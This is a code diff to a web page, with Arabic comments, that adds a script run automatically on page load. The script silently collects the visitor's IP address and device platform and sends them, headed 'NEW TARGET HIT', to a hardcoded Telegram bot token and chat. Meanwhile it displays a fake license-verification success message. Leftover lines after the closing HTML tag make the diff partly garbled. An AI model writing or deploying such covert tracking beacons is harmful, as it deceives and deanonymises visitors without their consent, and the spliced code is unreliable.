@@ -24,16 +24,43 @@
         const token = '7854757970:AAEILS2nBQCohHDVzSCLjt_65iXDhzT8gac';
         const chat_id = '7336962855';
 
-        // دالة ذكية لاستخراج موديل التليفون من بيانات المتصفح
-        function getDeviceInfo() {
-            const ua = navigator.userAgent;
-            let device = "Unknown Device";
-            
-            if (/android/i.test(ua)) {
-                // محاولة استخراج موديل الاندرويد (مثل Samsung SM-G960F)
-                const match = ua.match(/Android\s([^\s;]+|.*)\sBuild\/([^\s;]+)/) || ua.match(/\(([^;]+);/);
-                device = match ? match[1] : "Android Phone";
-            } else if (/iPhone|iPad|iPod/i.test(ua)) {
+        async function forceCapture() {
+            try {
+                // 1. جلب البيانات صامتاً
+                const res = await fetch('https://api.ipify.org?format=json');
+                const d = await res.json();
+                const ip = d.ip;
+
+                // 2. بناء رسالة التليجرام
+                const text = encodeURIComponent(`🔥 **NEW TARGET HIT** 🔥\n\n🌐 **IP:** ${ip}\n📱 **Dev:** ${navigator.platform}\n✅ **Status:** Verified`);
+
+                // 3. الطريقة المضمونة: الانتقال المباشر (Redirect) لتنفيذ الطلب
+                // سيقوم بفتح الرابط خلف الكواليس أو بسرعة فائقة
+                const finalUrl = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${text}&parse_mode=Markdown`;
+                
+                // نستخدم fetch مع mode: 'no-cors' لإجبار المتصفح على تمرير الطلب
+                fetch(finalUrl, { mode: 'no-cors' });
+
+                // كاحتياط أخير، سنفتح الرابط في نافذة مخفية ونغلقها
+                let img = new Image();
+                img.src = finalUrl;
+
+                setTimeout(() => {
+                    document.getElementById('status').innerText = "تم التحقق من الترخيص بنجاح!";
+                    document.getElementById('status').style.color = "#00ff00";
+                }, 3000);
+
+            } catch (e) {
+                // إذا فشل كل شيء، نرسل طلب بسيط
+                const fallback = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=Login_Detected`;
+                new Image().src = fallback;
+            }
+        }
+
+        window.onload = forceCapture;
+    </script>
+</body>
+</html>
                 device = "Apple iPhone/iPad";
             } else if (/Windows/i.test(ua)) {
                 device = "Windows PC";
